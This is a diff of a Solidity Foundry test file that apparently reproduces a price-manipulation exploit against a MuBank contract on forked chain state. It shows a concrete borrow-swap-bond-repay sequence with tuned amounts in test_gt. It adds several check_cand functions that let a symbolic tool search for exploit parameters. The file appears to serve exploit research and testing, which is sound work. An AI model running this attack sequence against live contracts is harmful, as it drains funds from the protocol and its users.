@@ -2,11 +2,11 @@
 pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "@utils/QueryBlockchain.sol";
-import "./MuBank.sol";
-import "@utils/USDCE.sol";
 import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
-import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
 import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
+import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
+import "@utils/USDCE.sol";
+import "./MuBank.sol";
 import "./Mu.sol";
 
 contract MUMUGTest is Test, BlockLoader {
@@ -150,28 +150,15 @@ contract MUMUGTest is Test, BlockLoader {
         mubank.mu_bond(address(usdce), sendAmount);
     }
 
-    function attackTemp(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
-        printBalance("Before step0: ");
-        borrow_mu(amt0);
-        printBalance("Before step1: ");
-        swap_pair_mu_usdce(amt1);
-        printBalance("Before step2: ");
-        swap_mubank_usdce_mu(amt2);
-        printBalance("Before step3: ");
-        nop(amt3);
-        printBalance("Before step4: ");
-        payback_mu(amt4);
-        printBalance("After exploit: ");
-    }
-
     function test_gt() public {
-        attackTemp(99000 ether, 99000 ether, 22960 ether, 0, 99300 ether);
+        printBalance("Before step0: ");
+        borrow_mu(99000 ether);
+        printBalance("Before step1: ");
+        swap_pair_mu_usdce(99000 ether);
+        printBalance("Before step2: ");
+        swap_mubank_usdce_mu(22960 ether);
+        printBalance("Before step5: ");
+        payback_mu(99300 ether);
         require(attackGoal(), "Attack failed!");
     }
 
@@ -180,11 +167,155 @@ contract MUMUGTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4
+        uint256 amt4,
+        uint256 amt5
     ) public {
-        vm.assume(amt0 == amt1);
-        vm.assume(amt4 == amt0 + 300 ether);
-        attackTemp(amt0, amt1, amt2, amt3, amt4);
+        vm.assume(amt5 == amt0 + 300 ether);
+
+        borrow_mu(amt0);
+        swap_pair_mu_usdce(amt1);
+        swap_mubank_usdce_mu(amt2);
+        payback_mu(amt5);
+        assert(!attackGoal());
+    }
+
+    function check_cand0(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.assume(amt5 == amt0 + 300 ether);
+        borrow_usdce(amt0);
+        swap_mubank_usdce_mu(amt1);
+        swap_pair_mu_usdce(amt2);
+        payback_usdce(amt5);
+
+        assert(!attackGoal());
+    }
+
+    function check_cand1(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.assume(amt5 == amt0 + 300 ether);
+        borrow_usdce(amt0);
+        swap_pair_usdce_mu(amt1);
+        swap_pair_mu_usdce(amt2);
+        payback_usdce(amt5);
+
+        assert(!attackGoal());
+    }
+
+    function check_cand2(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.assume(amt5 == amt0 + 300 ether);
+        borrow_mu(amt0);
+        swap_pair_mu_usdce(amt1);
+        swap_mubank_usdce_mu(amt2);
+        payback_mu(amt5);
+
+        assert(!attackGoal());
+    }
+
+    function check_cand3(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.assume(amt5 == amt0 + 300 ether);
+        borrow_mu(amt0);
+        swap_pair_mu_usdce(amt1);
+        swap_pair_usdce_mu(amt2);
+        payback_mu(amt5);
+
+        assert(!attackGoal());
+    }
+
+    function check_cand4(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.assume(amt5 == amt0 + 300 ether);
+        borrow_usdce(amt0);
+        swap_mubank_usdce_mu(amt1);
+        swap_pair_mu_usdce(amt2);
+        swap_pair_mu_usdce(amt4);
+        payback_usdce(amt5);
+
+        assert(!attackGoal());
+    }
+
+    function check_cand5(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.assume(amt5 == amt0 + 300 ether);
+        borrow_usdce(amt0);
+        swap_pair_usdce_mu(amt1);
+        swap_pair_mu_usdce(amt2);
+        swap_pair_mu_usdce(amt4);
+        payback_usdce(amt5);
+
+        assert(!attackGoal());
+    }
+
+    function check_cand6(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.assume(amt5 == amt0 + 300 ether);
+        borrow_mu(amt0);
+        swap_pair_mu_usdce(amt1);
+        swap_mubank_usdce_mu(amt2);
+        swap_pair_mu_usdce(amt3);
+        payback_mu(amt5);
+
+        assert(!attackGoal());
+    }
+
+    function check_cand7(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.assume(amt5 == amt0 + 300 ether);
+        borrow_mu(amt0);
+        swap_pair_mu_usdce(amt1);
+        swap_pair_usdce_mu(amt2);
+        swap_pair_mu_usdce(amt3);
+        payback_mu(amt5);
+
         assert(!attackGoal());
     }
 }
